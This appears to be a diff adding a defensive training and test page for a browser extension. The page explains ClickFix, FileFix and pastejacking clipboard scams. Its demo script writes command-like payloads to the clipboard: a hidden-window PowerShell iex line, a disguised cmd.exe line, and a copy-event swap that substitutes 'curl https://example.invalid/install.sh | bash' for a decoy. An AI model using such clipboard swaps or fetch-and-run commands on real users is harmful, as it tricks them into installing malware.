@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickFix Protection - Citadel</title>
+    <link rel="stylesheet" href="../control.css">
+    <style>
+        .demo-card {
+            background-color: var(--gray-50);
+            border: 1px solid var(--gray-200);
+            border-left: 4px solid var(--primary-color);
+            border-radius: var(--radius-md);
+            padding: var(--spacing-md);
+            margin-bottom: var(--spacing-md);
+        }
+
+        .demo-card h4 {
+            color: var(--primary-color);
+            margin-bottom: var(--spacing-xs);
+        }
+
+        .demo-card p {
+            font-size: 0.9rem;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .demo-payload {
+            display: block;
+            background-color: var(--gray-900);
+            color: #e2e8f0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            padding: var(--spacing-sm);
+            border-radius: var(--radius-sm);
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-bottom: var(--spacing-sm);
+            user-select: all;
+        }
+
+        .demo-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            padding: 0.5rem 1rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-right: var(--spacing-xs);
+        }
+
+        .demo-btn:hover { background-color: var(--primary-dark); }
+
+        .demo-btn.benign { background-color: var(--status-passed); }
+        .demo-btn.benign:hover { filter: brightness(0.9); }
+
+        .demo-status {
+            display: inline-block;
+            margin-left: var(--spacing-xs);
+            font-size: 0.85rem;
+            color: var(--gray-600);
+        }
+
+        .paste-box {
+            width: 100%;
+            min-height: 70px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            padding: var(--spacing-sm);
+            border: 1px dashed var(--gray-300);
+            border-radius: var(--radius-sm);
+            margin-top: var(--spacing-sm);
+        }
+
+        .danger-box {
+            background-color: var(--status-failed-bg);
+            border: 1px solid var(--status-failed);
+            border-radius: var(--radius-md);
+            padding: var(--spacing-md);
+            margin-top: var(--spacing-md);
+        }
+
+        .danger-box strong {
+            display: block;
+            color: var(--status-failed);
+            margin-bottom: var(--spacing-sm);
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="../">Citadel</a> / <span>Controls</span> / <span class="current">ClickFix Protection</span>
+        </div>
+        <h1>ClickFix &amp; Clipboard Command Scams</h1>
+    </header>
+
+    <section class="control-info">
+        <h2>What is this?</h2>
+        <p>
+            <strong>ClickFix</strong> (and its variants <strong>FileFix</strong> and <strong>pastejacking</strong>) is a
+            social-engineering attack. A web page convinces you to copy something to your clipboard and paste it
+            somewhere that runs commands — most often <strong>PowerShell</strong>, the Windows <strong>Run</strong> dialog
+            (<kbd>Win</kbd> + <kbd>R</kbd>), the File Explorer address bar, or a <strong>Terminal</strong>. What you paste
+            is not what it appears to be: it is a command that downloads and runs malware on your computer.
+        </p>
+        <p>
+            The lure is usually a fake instruction: <em>"Verify you are human — press Win+R, then Ctrl+V, then Enter"</em>,
+            <em>"To fix this error, paste the following into PowerShell"</em>, or a fake CAPTCHA / document-preview that
+            tells you to follow a few "quick steps". Because <em>you</em> performed the paste, the attack sidesteps many
+            browser and download protections.
+        </p>
+        <p>
+            Citadel watches the clipboard itself. Whenever a command-like payload lands on your clipboard — whether a
+            script wrote it, swapped it during a copy, or you copied text the page was displaying — Citadel scores it and
+            warns you <strong>before</strong> you paste it anywhere dangerous.
+        </p>
+    </section>
+
+    <section class="security-importance">
+        <h2>Why is this dangerous?</h2>
+        <div class="importance-grid">
+            <div class="importance-item">
+                <div class="icon">🎣</div>
+                <h3>It turns you into the delivery mechanism</h3>
+                <p>The page never runs the command — you do. A single paste into PowerShell or the Run box can install
+                    info-stealers, ransomware, or remote-access malware in seconds.</p>
+            </div>
+            <div class="importance-item">
+                <div class="icon">🎭</div>
+                <h3>What you see isn't what you paste</h3>
+                <p>The clipboard can be swapped at copy time, padded with spaces to hide the real command off-screen, or
+                    disguised as a harmless-looking file path (FileFix).</p>
+            </div>
+            <div class="importance-item">
+                <div class="icon">⏎</div>
+                <h3>It often runs instantly</h3>
+                <p>A hidden trailing newline means the command executes the moment it is pasted into the Run dialog or a
+                    terminal — you never get a chance to read it.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="remediation">
+        <h2>How to stay safe</h2>
+        <div class="method">
+            <ol>
+                <li><strong>Never paste anything into PowerShell, Terminal, or the Run dialog (<kbd>Win</kbd> + <kbd>R</kbd>)
+                    because a web page told you to.</strong> Legitimate websites never ask you to do this.</li>
+                <li>Be suspicious of any "verify you are human", "fix this error", or "complete these steps" message that
+                    involves keyboard shortcuts and pasting.</li>
+                <li>If Citadel shows you a clipboard warning, <strong>stop</strong>. Do not paste. Clear your clipboard by
+                    copying some harmless text (or just copy this sentence).</li>
+                <li>If you are unsure, contact your IT / security support before doing anything.</li>
+            </ol>
+        </div>
+
+        <div class="warning-box">
+            <strong>⚠️ Remember</strong>
+            <ul>
+                <li>Copying is harmless. <em>Pasting into a command prompt is where the damage happens.</em></li>
+                <li>This protection is a safety net, not a guarantee — it judges clipboard content, not your intent.</li>
+                <li>It cannot see commands you type by hand, or copy from an e-mail, screenshot, or another application.</li>
+            </ul>
+        </div>
+    </section>
+
+    <section class="verification">
+        <h2>Try it yourself (safe demos)</h2>
+        <p class="remediation-intro">
+            Each button below puts a <strong>real but harmless</strong> command on your clipboard, exercising a different
+            way an attacker delivers one. If the Citadel extension is active you should see a warning each time. Use the
+            <strong>paste box</strong> at the bottom to inspect what actually landed on your clipboard — that is safe.
+        </p>
+
+        <div class="danger-box">
+            <strong>🛑 Do not paste these into PowerShell, a terminal, or the Run dialog.</strong>
+            The demo commands are harmless (they only print a message), but the whole point of this page is to build the
+            habit of <em>not</em> pasting clipboard commands into a shell. Paste only into the inspection box below.
+        </div>
+
+        <h3 style="margin-top: var(--spacing-lg);">1. A page script writes the command (<code>clipboard.writeText</code>)</h3>
+        <div class="demo-card">
+            <h4>Programmatic clipboard write</h4>
+            <p>The classic ClickFix delivery: a script silently places a command on your clipboard, often ending in a
+                newline so it auto-runs the instant it is pasted.</p>
+            <span class="demo-payload" id="payload-writetext"></span>
+            <button class="demo-btn" data-demo="writetext">Copy with writeText()</button>
+            <span class="demo-status" id="status-writetext"></span>
+        </div>
+
+        <h3>2. A page disguises a command as a file path (FileFix, <code>execCommand</code>)</h3>
+        <div class="demo-card">
+            <h4>Path-disguised command</h4>
+            <p>FileFix tells you to paste a "file path" into the Explorer address bar — but the path is actually a command.</p>
+            <span class="demo-payload" id="payload-exec"></span>
+            <button class="demo-btn" data-demo="exec">Copy with execCommand()</button>
+            <span class="demo-status" id="status-exec"></span>
+        </div>
+
+        <h3>3. The clipboard is swapped during copy (pastejacking, <code>setData</code>)</h3>
+        <div class="demo-card">
+            <h4>What you see is not what you get</h4>
+            <p>The text below looks like a harmless install command. Copy it with the button — a copy handler swaps in
+                something else. Paste into the box at the bottom to see the difference.</p>
+            <span class="demo-payload" id="payload-decoy">npm install citadel-helper</span>
+            <button class="demo-btn" data-demo="setdata">Copy (with a hidden swap)</button>
+            <span class="demo-status" id="status-setdata"></span>
+        </div>
+
+        <h3>4. You manually copy a command the page displays (read-side)</h3>
+        <div class="demo-card">
+            <h4>Select &amp; copy by hand</h4>
+            <p>No script needed. Select the command below and press <kbd>Ctrl</kbd>/<kbd>Cmd</kbd> + <kbd>C</kbd> — Citadel
+                scores whatever you copy, regardless of how it got onto the clipboard.</p>
+            <span class="demo-payload" id="payload-manual">powershell -NoProfile -Command "Write-Host 'Citadel ClickFix test — if this were real, malware would now be running'"</span>
+            <button class="demo-btn" data-demo="selectmanual">Select the command</button>
+            <span class="demo-status" id="status-manual"></span>
+        </div>
+
+        <h3>5. A normal copy that should <em>not</em> warn</h3>
+        <div class="demo-card">
+            <h4>Benign control</h4>
+            <p>For comparison: copying an ordinary URL has no shell-command signals, so Citadel stays silent.</p>
+            <span class="demo-payload" id="payload-benign">https://citadelagent.org/control/ClickFix</span>
+            <button class="demo-btn benign" data-demo="benign">Copy harmless text</button>
+            <span class="demo-status" id="status-benign"></span>
+        </div>
+
+        <h3>Inspect your clipboard (safe)</h3>
+        <p class="remediation-intro">Click here and paste (<kbd>Ctrl</kbd>/<kbd>Cmd</kbd> + <kbd>V</kbd>) to see exactly
+            what is on your clipboard. This is a plain text box — pasting here runs nothing.</p>
+        <textarea class="paste-box" id="paste-box" placeholder="Paste here to inspect the clipboard contents…"></textarea>
+    </section>
+
+    <footer class="page-footer">
+        <p><a href="/control">Other Controls</a> | <a href="/">Home</a></p>
+    </footer>
+</div>
+
+<script>
+    // Harmless but detectable payloads. Each only prints a message if it were ever run; none download or execute
+    // anything. They are crafted to trip Citadel's clipboard scoring so this page doubles as a live test rig.
+    const PAYLOADS = {
+        // shell keyword + execution flags + trailing newline (auto-execute)
+        writetext: 'powershell -NoProfile -WindowStyle Hidden -Command "iex \'Write-Host hello-from-citadel-test\'"\n',
+        // looks like a file path but embeds a command (FileFix)
+        exec: 'C:\\Windows\\System32\\cmd.exe /c "echo Citadel ClickFix test"',
+        // the decoy the user sees vs. the command actually placed on the clipboard
+        decoy: 'npm install citadel-helper',
+        setdata: 'curl https://example.invalid/install.sh | bash',
+        benign: 'https://citadelagent.org/control/ClickFix'
+    }
+
+    document.getElementById('payload-writetext').textContent = PAYLOADS.writetext
+    document.getElementById('payload-exec').textContent = PAYLOADS.exec
+
+    function setStatus(id, message, ok) {
+        const el = document.getElementById('status-' + id)
+        el.textContent = message
+        el.style.color = ok ? 'var(--status-passed)' : 'var(--status-failed)'
+    }
+
+    async function copyWriteText(id, text) {
+        try {
+            await navigator.clipboard.writeText(text)
+            setStatus(id, '✓ copied — Citadel should warn you now', true)
+        } catch (e) {
+            setStatus(id, '✗ clipboard blocked by the browser (' + e.message + ')', false)
+        }
+    }
+
+    function copyExecCommand(id, text) {
+        const ta = document.createElement('textarea')
+        ta.value = text
+        ta.style.position = 'fixed'
+        ta.style.opacity = '0'
+        document.body.appendChild(ta)
+        ta.select()
+        let ok = false
+        try { ok = document.execCommand('copy') } catch (e) {}
+        document.body.removeChild(ta)
+        setStatus(id, ok ? '✓ copied — Citadel should warn you now' : '✗ execCommand copy failed', ok)
+    }
+
+    // pastejacking: copy the decoy, but a one-shot copy handler swaps in the real payload via setData
+    function copyWithSwap(id, swapText) {
+        const onCopy = (event) => {
+            event.preventDefault()
+            event.clipboardData.setData('text/plain', swapText)
+            document.removeEventListener('copy', onCopy, true)
+        }
+        document.addEventListener('copy', onCopy, true)
+
+        const decoy = document.getElementById('payload-decoy')
+        const range = document.createRange()
+        range.selectNodeContents(decoy)
+        const sel = window.getSelection()
+        sel.removeAllRanges()
+        sel.addRange(range)
+
+        let ok = false
+        try { ok = document.execCommand('copy') } catch (e) {}
+        sel.removeAllRanges()
+        setStatus(id, ok ? '✓ copied — paste below to see what really landed' : '✗ copy failed', ok)
+    }
+
+    function selectManual(id) {
+        const el = document.getElementById('payload-manual')
+        const range = document.createRange()
+        range.selectNodeContents(el)
+        const sel = window.getSelection()
+        sel.removeAllRanges()
+        sel.addRange(range)
+        setStatus(id, 'selected — now press Ctrl/Cmd + C', true)
+    }
+
+    document.querySelectorAll('.demo-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const demo = btn.dataset.demo
+            if (demo === 'writetext') copyWriteText(demo, PAYLOADS.writetext)
+            else if (demo === 'exec') copyExecCommand(demo, PAYLOADS.exec)
+            else if (demo === 'setdata') copyWithSwap(demo, PAYLOADS.setdata)
+            else if (demo === 'selectmanual') selectManual('manual')
+            else if (demo === 'benign') copyWriteText(demo, PAYLOADS.benign)
+        })
+    })
+</script>
+</body>
+</html>
